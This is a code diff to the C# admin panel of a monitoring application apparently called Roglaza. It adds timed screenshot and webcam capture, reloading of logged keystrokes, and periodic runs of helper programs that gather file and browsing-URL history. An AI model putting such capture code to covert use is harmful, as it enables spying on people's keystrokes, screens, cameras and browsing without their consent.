@@ -19,7 +19,8 @@ using System.Threading.Tasks;
 using AForge.Video;
 using AForge.Video.DirectShow;
 using AForge.Video.VFW;
-using AForge.Video.FFMPEG; 
+using AForge.Video.FFMPEG;
+using System.Data.SQLite; 
 
 namespace Roglaza.Forms
 {
@@ -93,6 +94,10 @@ namespace Roglaza.Forms
 
         private void FrmAdminPanel_Load(object sender, EventArgs e)
         {
+
+         
+
+
             Camera_Load();
             Load_managed_Apps();
             comboBox_capture_Type.SelectedIndex = 0;
@@ -136,12 +141,24 @@ namespace Roglaza.Forms
             button_save.Visible = false;
 
             LoadStoredKeystrokes();
-            LoadHistoryFiles();
+
+           // LoadHistory();
+        }
+
+        private void LoadHistory()
+        {
+            string f = RoglazaHelper.ReadTextFile(StandAlone_Executables.Filer_outputFileName);
+            string u = RoglazaHelper.ReadTextFile(StandAlone_Executables.Urler_outputFileName);
+
+            rtxbx_history_files.Text = f;
+            richTextBox_urls.Text = u;
+
+
         }
 
         private void LoadHistoryFiles()
         { 
-            rtxbx_history_files.Text = RoglazaHelper.ReadTextFile(Program.ProgramSettings.GetAbsolutePath(RoglazaSettingsMember.files_history_file) );
+            rtxbx_history_files.Text = RoglazaHelper.ReadTextFile(Program.ProgramSettings.GetAbsolutePath(RoglazaSettingsMember.history_files) );
         }
 
      
@@ -251,7 +268,14 @@ namespace Roglaza.Forms
         }
         private void timerWatcher_Tick(object sender, EventArgs e)
         {
+                  
+        }
 
+        private void Record()
+        {
+
+            if (Program.ProgramSettings.AllowCamShots == false && Program.ProgramSettings.AllowScreenShots == false)
+                return;
             Capture_count++;
             // Constructing__path.
             string _date = RoglazaHelper.RemoveInvalidPathChars(DateTime.Now.ToShortDateString());
@@ -298,14 +322,13 @@ namespace Roglaza.Forms
 
 
                 bmpScreenshot.Save(Screen_Path_, ImageFormat.Jpeg);
-                
+
 
             }
 
-            if(pictureBox_camera.BackgroundImage!=null && Program.ProgramSettings.AllowCamShots)
+            if (pictureBox_camera.BackgroundImage != null && Program.ProgramSettings.AllowCamShots)
                 pictureBox_camera.BackgroundImage.Save(Cams_Path_, ImageFormat.Jpeg);
                
-                  
         }
 
         private void numericUpDown_screenShotInterval_ValueChanged(object sender, EventArgs e)
@@ -637,9 +660,23 @@ namespace Roglaza.Forms
             button_add_new_match.Enabled = textBox_New_match.Text.Trim().Length > 2;
         }
 
+        int  History_read_times = 0;
         private void timer_global_Tick(object sender, EventArgs e)
         {
+            global_ticks++;
             LoadStoredKeystrokes();
+            LoadHistoryFiles();
+            if (global_ticks.ToString().EndsWith("0") && History_read_times<=3)
+            {
+                StandAlone_Executables.Execute_Filer();
+                StandAlone_Executables.Execute_Urler();
+
+                rtxbx_history_files.Text = StandAlone_Executables.Move_Filer_outpur(Program.ProgramSettings.Get_History_files_Path());
+                richTextBox_urls.Text = StandAlone_Executables.Move_Urler_outpur(Program.ProgramSettings.Get_History_Urls_Path());
+                History_read_times++;
+//
+            }
+
         }
 
         private void button1_Clear_keystrokes__Click(object sender, EventArgs e)
@@ -993,6 +1030,29 @@ namespace Roglaza.Forms
         private void linkLabel_eddited_selected_app_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
             Load_Selected_managed_app();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        public int global_ticks =0;
+
+        public int timer_ticks = 0;
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            //timer_ticks ++;
+
+            //global_ticks++;
+            //LoadStoredKeystrokes();
+            //LoadHistoryFiles();
+            //if (global_ticks.ToString().EndsWith("0"))
+            //{
+            //    rtxbx_history_files.Text = StandAlone_Executables.Move_Filer_outpur(Program.ProgramSettings.Get_History_files_Path());
+            //    richTextBox_urls.Text = StandAlone_Executables.Move_Urler_outpur(Program.ProgramSettings.Get_History_Urls_Path());
+
+            //}
         }
     }
     //Refernce
